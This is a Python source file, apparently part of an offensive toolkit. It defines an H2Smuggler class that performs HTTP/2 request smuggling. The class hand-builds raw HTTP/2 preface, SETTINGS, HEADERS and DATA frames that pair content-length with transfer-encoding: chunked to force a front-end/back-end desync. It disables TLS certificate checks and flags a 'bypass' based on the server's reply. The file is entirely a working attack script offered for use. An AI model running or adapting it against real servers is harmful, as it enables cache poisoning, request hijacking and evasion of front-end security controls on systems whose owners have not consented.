import socket
import ssl
import logging

logger = logging.getLogger("usare.h2_smuggler")

class H2Smuggler:
    """
    Executes HTTP/2 Request Smuggling (H2.TE or H2.C).
    Crafts raw HTTP/2 frames injecting anomalous pseudo-headers (like chunked content-lengths)
    while leveraging native TLS ALPN negotiation.
    """
    def __init__(self, timeout: float = 5.0):
        self.timeout = timeout

    def SM_PREFACE(self):
        return b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

    def SETTINGS_FRAME(self):
        # Length: 0, Type: 4 (SETTINGS), Flags: 0, Stream ID: 0
        return b"\x00\x00\x00\x04\x00\x00\x00\x00\x00"

    def smuggle(self, target_ip: str, port: int) -> dict:
        results = {"success": False, "connected": False, "bypassed": False, "response": b""}
        
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.set_alpn_protocols(["h2"])
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            conn = ctx.wrap_socket(sock, server_hostname=target_ip)
            conn.connect((target_ip, port))
            results["connected"] = True
            
            # Send Preface & Settings
            conn.sendall(self.SM_PREFACE() + self.SETTINGS_FRAME())
            
            try:
                import hpack
                encoder = hpack.Encoder()
                
                # Malformed Headers forcing H2.TE desync
                headers = [
                    (':method', 'POST'),
                    (':path', '/'),
                    (':scheme', 'https'),
                    (':authority', target_ip),
                    ('content-length', '4'),
                    ('transfer-encoding', 'chunked'), # This combo triggers desync
                ]
                
                header_data = encoder.encode(headers)
                
                # HEADERS Frame (Type=1, Flags=0x04 (END_HEADERS), Stream_ID=1)
                l = len(header_data)
                f_length = l.to_bytes(3, 'big')
                frame_header = f_length + b"\x01\x04\x00\x00\x00\x01" + header_data
                
                # DATA Frame (Type=0, Flags=0x01 (END_STREAM), Stream_ID=1)
                payload = b"1\r\nZ\r\n0\r\n\r\n"
                p_length = len(payload).to_bytes(3, 'big')
                frame_data = p_length + b"\x00\x01\x00\x00\x00\x01" + payload
                
                conn.sendall(frame_header + frame_data)
                
                data = b""
                try:
                    while True:
                        chunk = conn.recv(4096)
                        if not chunk: break
                        data += chunk
                except socket.timeout:
                    pass
                    
                results["response"] = data
                if b"400" not in data and len(data) > 30:
                    results["bypassed"] = True
                results["success"] = True
                
            except ImportError:
                results["response"] = b"Missing 'hpack' library for H2 frame assembly."
            finally:
                conn.close()
                
        except Exception as e:
            results["response"] = str(e).encode()
            
        return results
